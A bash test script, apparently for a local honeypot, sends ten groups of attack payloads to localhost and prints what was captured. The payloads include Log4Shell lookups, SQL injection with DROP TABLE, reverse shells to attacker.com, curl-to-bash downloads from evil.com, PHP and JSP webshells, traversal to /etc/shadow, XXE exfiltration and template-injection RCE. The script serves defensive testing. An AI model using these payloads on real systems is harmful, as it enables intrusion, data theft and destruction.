#!/bin/bash

echo "🎯 Testing Juicy Payload Capture - Finding the Unknown"
echo "======================================================"
echo ""

BASE="http://localhost:8080"

# Clean old captures
rm -rf captures/* 2>/dev/null

echo "=== Test 1: Log4Shell with Obfuscation ==="
echo "Testing various JNDI injection techniques..."
curl -s "$BASE/admin" \
  -H "X-Api-Version: \${jndi:ldap://\${env:USER}.attacker.com:1389/Exploit}" \
  -H "User-Agent: \${jndi:ldap://\${sys:java.version}.evil.com/a}" \
  -H "Referer: \${jndi:\${lower:l}\${lower:d}a\${lower:p}://attacker.com/Shell}" \
  >/dev/null
echo "✓ Log4Shell payloads sent"
sleep 1

echo ""
echo "=== Test 2: SQL Injection with Data Exfiltration ==="
echo "Testing SQL injection to extract data..."
curl -s "$BASE/login" \
  -d "username=admin' UNION SELECT username,password,email FROM users WHERE '1'='1" \
  -d "password=x' OR 1=1; DROP TABLE users; --" \
  >/dev/null

curl -s "$BASE/search?q=1' AND (SELECT * FROM (SELECT SLEEP(5))a)--" >/dev/null

curl -s "$BASE/api?id=1' UNION SELECT table_name,column_name,data_type FROM information_schema.columns--" >/dev/null
echo "✓ SQL injection payloads sent"
sleep 1

echo ""
echo "=== Test 3: Command Injection Variants ==="
echo "Testing various command injection techniques..."
curl -s "$BASE/admin?cmd=whoami;cat%20/etc/passwd" >/dev/null
curl -s "$BASE/ping?host=8.8.8.8;curl%20http://evil.com/shell.sh|bash" >/dev/null
curl -s "$BASE/debug?log=\$(curl%20attacker.com/backdoor.sh|sh)" >/dev/null
curl -s "$BASE/exec?command=\`nc%20-e%20/bin/sh%20attacker.com%204444\`" >/dev/null
curl -s "$BASE/run?script=|wget%20http://evil.com/rootkit%20-O%20/tmp/r;chmod%20777%20/tmp/r;/tmp/r|" >/dev/null
echo "✓ Command injection payloads sent"
sleep 1

echo ""
echo "=== Test 4: Webshell Upload Attempts ==="
echo "Testing webshell upload..."

# PHP webshell
curl -s "$BASE/upload" \
  -F "file=@-;filename=shell.php" \
  -F "content=<?php @eval(\$_POST['cmd']); ?>" \
  <<< '<?php @eval($_POST["cmd"]); ?>' \
  >/dev/null

# Obfuscated PHP webshell
curl -s "$BASE/admin/upload.php" \
  -d 'file=<?php $a=base64_decode("ZXZhbA==");$b=$_POST["x"];$a($b);?>' \
  >/dev/null

# JSP webshell
curl -s "$BASE/upload" \
  -F "file=@-;filename=cmd.jsp" \
  <<< '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' \
  >/dev/null

echo "✓ Webshell upload payloads sent"
sleep 1

echo ""
echo "=== Test 5: Path Traversal with File Reads ==="
echo "Testing path traversal..."
curl -s "$BASE/download?file=../../../etc/passwd" >/dev/null
curl -s "$BASE/view?path=....//....//....//etc/shadow" >/dev/null
curl -s "$BASE/read?f=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fsudoers" >/dev/null
curl -s "$BASE/include?page=../../../var/log/auth.log" >/dev/null
echo "✓ Path traversal payloads sent"
sleep 1

echo ""
echo "=== Test 6: Serialization Attacks ==="
echo "Testing Java/PHP serialization exploits..."

# Java serialization
curl -s "$BASE/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  -d "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmSuAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAEGphdmEubGFuZy5TdHJpbmf4xmTLR7GwZQIAAUwABXZhbHVldAASW0xqYXZhL2xhbmcvU3RyaW5nO3hwdAAEZXZpbHNxAH4AAnQAEmN1cmwgZXZpbC5jb20vc2h4" \
  >/dev/null

# PHP serialization
curl -s "$BASE/unserialize.php" \
  -d 'data=O:8:"stdClass":1:{s:4:"exec";s:23:"curl evil.com/shell.sh";}' \
  >/dev/null

echo "✓ Serialization payloads sent"
sleep 1

echo ""
echo "=== Test 7: XXE (XML External Entity) Injection ==="
echo "Testing XXE attacks..."
curl -s "$BASE/api/xml" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>' \
  >/dev/null

curl -s "$BASE/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://attacker.com/steal?data=">]><root>&xxe;</root>' \
  >/dev/null

echo "✓ XXE payloads sent"
sleep 1

echo ""
echo "=== Test 8: Template Injection ==="
echo "Testing SSTI (Server-Side Template Injection)..."
curl -s "$BASE/render?template={{7*7}}" >/dev/null
curl -s "$BASE/view?page={{config.__class__.__init__.__globals__['os'].popen('id').read()}}" >/dev/null
curl -s "$BASE/template?data=\${7*7}" >/dev/null
curl -s "$BASE/eval?expr={{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}" >/dev/null
echo "✓ Template injection payloads sent"
sleep 1

echo ""
echo "=== Test 9: Advanced RCE Techniques ==="
echo "Testing remote code execution..."

# Reverse shell payloads
curl -s "$BASE/exec" \
  -d "cmd=bash -i >& /dev/tcp/attacker.com/4444 0>&1" \
  >/dev/null

curl -s "$BASE/run" \
  -d "script=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" \
  >/dev/null

# Encoded payloads
curl -s "$BASE/api/exec?cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx%20|%20base64%20-d%20|%20bash" \
  >/dev/null

echo "✓ RCE payloads sent"
sleep 1

echo ""
echo "=== Test 10: Credential Harvesting ==="
echo "Testing credential theft..."
curl -s "$BASE/admin/login" \
  -d "username=administrator&password=P@ssw0rd123!&token=stolen_session_token" \
  >/dev/null

curl -s "$BASE/auth" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJ1c2VyIn0.fakesignature" \
  >/dev/null

curl -s "$BASE/api/keys" \
  -d "api_key=sk_live_ABC123DEF456&secret=my_secret_password" \
  >/dev/null

echo "✓ Credential theft payloads sent"
sleep 2

echo ""
echo "=========================================================="
echo "📊 Checking Captures..."
echo "=========================================================="
echo ""

sleep 2

# Count captures
COMMANDS=$(find captures/commands/ -type f 2>/dev/null | wc -l | tr -d ' ')
FILES=$(find captures/files/ -type f ! -name "*.meta" 2>/dev/null | wc -l | tr -d ' ')
WEBSHELLS=$(find captures/webshells/ -type f ! -name "*.analysis" 2>/dev/null | wc -l | tr -d ' ')
SQL=$(find captures/sql/ -type f 2>/dev/null | wc -l | tr -d ' ')
PAYLOADS=$(find captures/payloads/ -type f ! -name "*.meta" 2>/dev/null | wc -l | tr -d ' ')

echo "📈 Capture Summary:"
echo "  Commands:     $COMMANDS"
echo "  Files:        $FILES"
echo "  Webshells:    $WEBSHELLS"
echo "  SQL:          $SQL"
echo "  Payloads:     $PAYLOADS"
echo ""

if [ "$COMMANDS" -gt "0" ]; then
    echo "🔥 Sample Command Capture:"
    find captures/commands -type f | head -1 | xargs cat | head -20
    echo ""
fi

if [ "$SQL" -gt "0" ]; then
    echo "🔥 Sample SQL Injection:"
    find captures/sql -type f | head -1 | xargs cat | head -20
    echo ""
fi

if [ "$PAYLOADS" -gt "0" ]; then
    echo "🔥 Sample Payload Capture:"
    find captures/payloads -type f -name "*.bin" | head -1 | xargs cat
    echo ""
fi

if [ "$WEBSHELLS" -gt "0" ]; then
    echo "🔥 Sample Webshell:"
    find captures/webshells -type f ! -name "*.analysis" | head -1 | xargs cat | head -10
    echo ""
fi

echo "✅ Test complete! View all captures in: captures/"
echo "✅ View dashboard at: http://localhost:9090"
